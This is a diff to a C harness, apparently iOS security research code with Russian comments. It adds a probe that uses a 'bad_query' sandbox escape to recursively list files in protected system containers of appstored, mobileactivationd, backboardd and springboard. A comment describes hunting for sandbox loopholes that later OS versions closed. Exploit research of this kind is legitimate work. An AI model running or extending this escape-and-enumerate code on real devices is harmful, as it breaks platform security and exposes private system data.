@@ -46978,6 +46978,69 @@ static void p_bq107(void) {
     fsync(fileno(stderr));
 }
 
+// p_bq108 — v268: глубокий листинг контейнера appstored + powerd (§261-next).
+// §258 показал только верхний уровень; нужны файлы ВНУТРИ Library/Preferences,
+// Library/Caches, Library/Application Support, Documents.
+static void p_bq108(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    LOG("[bq108] v268: глубокий листинг контейнеров Tier-A (§261)");
+    fsync(fileno(stderr));
+    int64_t h = bad_query((char *)"/var/containers/Data/System", 0, (char *)grp, 0);
+    if (h < 0) { LOG("[bq108] escape FAIL"); return; }
+
+    static const struct {
+        const char *uuid;
+        const char *name;
+    } targets[] = {
+        { "3E27999E-F441-4625-A423-AF11E87F71E8", "appstored" },
+        { "A5B70654-D1AD-4A0C-B967-BE2BEC7BDA45", "mobileactivationd" },
+        { "867912A4-A70D-428C-9551-D28453B6F1B4", "backboardd" },
+        { "D751CF7C-BB34-4A31-9D9A-D8DA5EBF4DEB", "springboard" },
+    };
+    for (unsigned t = 0; t < sizeof(targets) / sizeof(targets[0]); t++) {
+        char root[512];
+        snprintf(root, sizeof(root), "/var/containers/Data/System/%s",
+                 targets[t].uuid);
+        LOG("[bq108] === [%s] %s", targets[t].name, targets[t].uuid);
+        fsync(fileno(stderr));
+        // рекурсивный обход до 4 уровней
+        static const char *dirs[] = {
+            "", "/Documents", "/Library", "/Library/Preferences",
+            "/Library/Caches", "/Library/Application Support",
+            "/Library/Application Support/ManagedApps",
+        };
+        for (unsigned d = 0; d < sizeof(dirs) / sizeof(dirs[0]); d++) {
+            char dp[900];
+            snprintf(dp, sizeof(dp), "%s%s", root, dirs[d]);
+            DIR *dd = opendir(dp);
+            if (!dd) continue;
+            struct dirent *de2;
+            int cnt = 0;
+            while ((de2 = readdir(dd)) && cnt < 60) {
+                if (de2->d_name[0] == '.') continue;
+                cnt++;
+                struct stat st = {0};
+                char fp[1100];
+                snprintf(fp, sizeof(fp), "%s/%s", dp, de2->d_name);
+                if (stat(fp, &st) == 0) {
+                    LOG("[bq108]   %s%s/%s (%lld KB%s)",
+                        dirs[d], dirs[d][0] ? "" : "/",
+                        de2->d_name, (long long)(st.st_size >> 10),
+                        S_ISDIR(st.st_mode) ? ", dir" : "");
+                } else {
+                    LOG("[bq108]   %s%s/%s (stat errno %d)",
+                        dirs[d], dirs[d][0] ? "" : "/", de2->d_name, errno);
+                }
+            }
+            closedir(dd);
+        }
+        fsync(fileno(stderr));
+    }
+    bad_query_release(h);
+    LOG("[bq108] ИТОГ: глубокий листинг завершён");
+    fsync(fileno(stderr));
+}
+
 // p_bq87 — v246: SANDBOX-ЛАЗЕЙКИ — что 27.2 ЗАКРЫЛ, а b4 ещё открыт?
 // security_sandbox кекст: +133 правил в 27.2. Каждое новое правило =
 // что-то было РАЗРЕШЕНО в 27.0 (наш b4) и ЗАПРЕЩЕНО в 27.2.
@@ -55599,6 +55662,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ105")) { p_bq105(); LOG("[probe13] bq105-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ106")) { p_bq106(); LOG("[probe13] bq106-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ107")) { p_bq107(); LOG("[probe13] bq107-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ108")) { p_bq108(); LOG("[probe13] bq108-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
